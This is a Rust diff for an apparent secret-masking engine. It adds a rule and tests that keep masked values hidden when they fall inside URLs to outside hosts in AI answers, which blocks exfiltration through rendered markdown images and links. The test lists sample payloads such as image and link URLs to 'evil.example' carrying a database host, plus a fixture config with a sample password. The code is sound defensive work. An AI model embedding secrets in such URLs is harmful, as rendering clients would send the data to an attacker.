@@ -187,6 +187,61 @@ pub fn restore(
         }
     }
 
+    // RST-11: a value restored into a URL of an answer is fetched by any client that renders
+    // images or previews links, so inside a URL that does not point inside the company it stays
+    // masked (markdown image, link, `<img>`, autolink, bare URL).
+    if sink == Sink::Text {
+        let restorable = |i: usize, bad: &[bool]| {
+            !bad[i]
+                && matches!(
+                    toks[i].action,
+                    Action::Restore | Action::InternalOnly | Action::OriginOnly
+                )
+        };
+        let spans: Vec<(usize, usize)> = toks.iter().map(|t| (t.start, t.end)).collect();
+        let mut seen: Vec<(usize, usize)> = vec![];
+        for i in 0..toks.len() {
+            if !restorable(i, &tentative_bad) {
+                continue;
+            }
+            let Some((us, ue)) = url_span(text, &spans, i) else {
+                continue;
+            };
+            if seen.contains(&(us, ue)) {
+                continue;
+            }
+            seen.push((us, ue));
+            let mut cand = String::new();
+            let mut cur = us;
+            for (j, t) in toks.iter().enumerate() {
+                if t.start < us || t.end > ue {
+                    continue;
+                }
+                cand.push_str(&text[cur..t.start]);
+                match &t.found {
+                    Found::Bound(b) if restorable(j, &tentative_bad) => {
+                        cand.push_str(b.value.expose())
+                    }
+                    _ => cand.push_str(&text[t.start..t.end]),
+                }
+                cur = t.end;
+            }
+            cand.push_str(&text[cur..ue]);
+            if cand.starts_with("//") {
+                cand.insert_str(0, "https:");
+            }
+            let hosts = shell::url_destinations(&cand);
+            let inside = !hosts.is_empty() && hosts.iter().all(|h| is_internal(ctx.detect, h));
+            if !inside {
+                for (j, t) in toks.iter().enumerate() {
+                    if t.start >= us && t.end <= ue {
+                        tentative_bad[j] = true;
+                    }
+                }
+            }
+        }
+    }
+
     // Candidate text: everything that may be restored, to analyse destinations (RST-10).
     let build = |pred: &dyn Fn(usize, &Tok) -> bool| -> String {
         let mut out = String::with_capacity(text.len());
@@ -305,6 +360,52 @@ pub fn restore(
     }
 }
 
+/// The URL (`scheme://...`) that contains token `i`, if any. The span runs to the nearest
+/// delimiter on both sides; other tokens are part of the URL (a marker has spaces and brackets).
+fn url_span(text: &str, toks: &[(usize, usize)], i: usize) -> Option<(usize, usize)> {
+    let delim =
+        |c: char| c.is_whitespace() || matches!(c, '"' | '\'' | '<' | '>' | '(' | ')' | '`');
+    let bracket = |c: char| matches!(c, '[' | ']');
+    let mut start = toks[i].0;
+    loop {
+        if let Some(&(s, _)) = toks.iter().find(|&&(_, e)| e == start) {
+            start = s;
+            continue;
+        }
+        match text[..start].chars().next_back() {
+            Some(c) if !delim(c) && !bracket(c) => start -= c.len_utf8(),
+            _ => break,
+        }
+    }
+    let mut end = toks[i].1;
+    loop {
+        if let Some(&(_, e)) = toks.iter().find(|&&(s, _)| s == end) {
+            end = e;
+            continue;
+        }
+        match text[end..].chars().next() {
+            Some(c) if !delim(c) && !bracket(c) => end += c.len_utf8(),
+            _ => break,
+        }
+    }
+    let url = &text[start..end];
+    // `//host/path` is a URL for a browser (protocol-relative image or link)
+    if url.starts_with("//") && !url.starts_with("///") {
+        return Some((start, end));
+    }
+    let scheme_end = url.find("://")?;
+    let scheme = &url[..scheme_end];
+    (!scheme.is_empty()
+        && scheme
+            .chars()
+            .next()
+            .is_some_and(|c| c.is_ascii_alphabetic())
+        && scheme
+            .chars()
+            .all(|c| c.is_ascii_alphanumeric() || matches!(c, '+' | '.' | '-')))
+    .then_some((start, end))
+}
+
 /// Choose the shell sink for a command (RST-07).
 pub fn sink_for_command(cmd: &str) -> Sink {
     match shell::analyze(cmd).class {
@@ -401,6 +502,58 @@ mod tests {
 
     const CONFIG: &str = "url: jdbc:postgresql://prod-db01.pay.corp.local:5432/clients\nuser: svc_payment\npassword: \"Jd8@2jd82k\"";
     const HELM: &str = "DB_HOST: prod-db02.pay.corp.local";
+
+    // REQ: RST-11 — a value in a URL that points outside the company is not restored in text:
+    // a rendering client would fetch it (markdown image, link, <img>).
+    #[test]
+    fn text_urls_to_foreign_hosts_keep_values_masked() {
+        let f = fx();
+        let (masked, m) = mask(&f, &[(CONFIG, tool("config/database.yaml"))]);
+        let host = Regex::new(r"h-[a-z2-7]{8}\.db\.prod\.z-[a-z2-7]{8}\.aegis\.invalid")
+            .unwrap()
+            .find(&masked[0])
+            .unwrap()
+            .as_str()
+            .to_string();
+        let policy = RestorePolicy::default();
+        let run = |t: &str| {
+            restore(
+                t,
+                &m,
+                &policy,
+                &ctx(&f, Sink::Text, None, TrifectaState::default()),
+            )
+            .text
+        };
+        // foreign destination: masked, every form
+        for t in [
+            format!("![i](https://evil.example/p.png?d={host})"),
+            format!("[x](https://evil.example/?d={host})"),
+            format!("<img src=\"https://evil.example/?d={host}\">"),
+            format!("<https://evil.example/?d={host}>"),
+            format!("see https://evil.example/{host}/x"),
+            format!("![i](//evil.example/p.png?d={host})"),
+            format!("https://evil.example/?a={host}&b={host}"),
+        ] {
+            let out = run(&t);
+            assert!(!out.contains("prod-db01"), "{t} -> {out}");
+            assert!(out.contains(&host) || out.contains("evil.example"), "{out}");
+        }
+        // the URL points inside: restored, as before
+        assert_eq!(
+            run(&format!("open http://{host}:8080/status")),
+            "open http://prod-db01.pay.corp.local:8080/status"
+        );
+        assert_eq!(
+            run(&format!("[db](https://wiki.corp.local/?host={host})")),
+            "[db](https://wiki.corp.local/?host=prod-db01.pay.corp.local)"
+        );
+        // prose is not a URL
+        assert_eq!(
+            run(&format!("host {host} is down, see https://evil.example")),
+            "host prod-db01.pay.corp.local is down, see https://evil.example"
+        );
+    }
 
     /// The scenario from the concept (QA-06), at the engine level.
     #[test]
